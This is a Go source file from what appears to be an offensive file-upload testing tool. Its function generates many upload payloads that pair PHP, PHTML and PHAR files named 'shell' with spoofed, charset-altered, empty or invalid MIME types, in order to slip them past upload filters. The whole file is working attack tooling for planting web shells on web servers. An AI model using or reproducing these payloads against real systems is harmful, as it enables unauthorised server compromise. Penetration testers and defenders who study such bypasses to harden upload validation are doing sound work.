package bypass

import (
	"fux/config"
)

// MIMEPayloads generates MIME type bypass payloads
func MIMEPayloads(baseContent []byte) []config.BypassPayload {
	var payloads []config.BypassPayload

	// Common MIME types that may bypass filters
	mimeTypes := []struct {
		mime string
		desc string
	}{
		{"image/jpeg", "JPEG Image"},
		{"image/png", "PNG Image"},
		{"image/gif", "GIF Image"},
		{"image/bmp", "BMP Image"},
		{"image/webp", "WebP Image"},
		{"image/svg+xml", "SVG Image"},
		{"image/x-icon", "ICO Image"},
		{"image/tiff", "TIFF Image"},

		{"application/octet-stream", "Binary Stream"},
		{"application/x-www-form-urlencoded", "Form Data"},

		{"text/plain", "Plain Text"},
		{"text/html", "HTML"},
		{"text/css", "CSS"},
		{"text/javascript", "JavaScript"},

		{"application/pdf", "PDF Document"},
		{"application/msword", "Word Document"},
		{"application/vnd.ms-excel", "Excel Document"},

		{"application/zip", "ZIP Archive"},
		{"application/x-rar-compressed", "RAR Archive"},
		{"application/x-tar", "TAR Archive"},

		{"video/mp4", "MP4 Video"},
		{"audio/mpeg", "MP3 Audio"},

		// Rare/Legacy MIME types
		{"application/x-httpd-php", "PHP (explicit)"},
		{"application/php", "PHP Application"},
		{"text/x-php", "PHP Text"},
		{"application/x-php", "PHP X"},
	}

	// Generate payloads with different MIME types
	extensions := []string{"php", "phtml", "phar"}

	for _, ext := range extensions {
		for _, m := range mimeTypes {
			payloads = append(payloads, config.BypassPayload{
				Name:        m.desc + " MIME with ." + ext,
				FileName:    "shell." + ext,
				Content:     baseContent,
				ContentType: m.mime,
				Category:    "mime-type",
			})
		}
	}

	// MIME type with charset variations
	charsetVariations := []string{
		"image/jpeg; charset=utf-8",
		"image/png; charset=binary",
		"image/gif; charset=ISO-8859-1",
		"text/plain; charset=utf-8",
		"application/octet-stream; charset=binary",
	}

	for _, mime := range charsetVariations {
		payloads = append(payloads, config.BypassPayload{
			Name:        "MIME with Charset: " + mime,
			FileName:    "shell.php",
			Content:     baseContent,
			ContentType: mime,
			Category:    "mime-charset",
		})
	}

	// Empty MIME type
	payloads = append(payloads, config.BypassPayload{
		Name:        "Empty MIME Type",
		FileName:    "shell.php",
		Content:     baseContent,
		ContentType: "",
		Category:    "mime-empty",
	})

	// Invalid MIME types
	invalidMimes := []string{
		"xxx/xxx",
		"invalid",
		"image",
		"/",
		"*/*",
		"image/*",
	}
	for _, mime := range invalidMimes {
		payloads = append(payloads, config.BypassPayload{
			Name:        "Invalid MIME: " + mime,
			FileName:    "shell.php",
			Content:     baseContent,
			ContentType: mime,
			Category:    "mime-invalid",
		})
	}

	return payloads
}
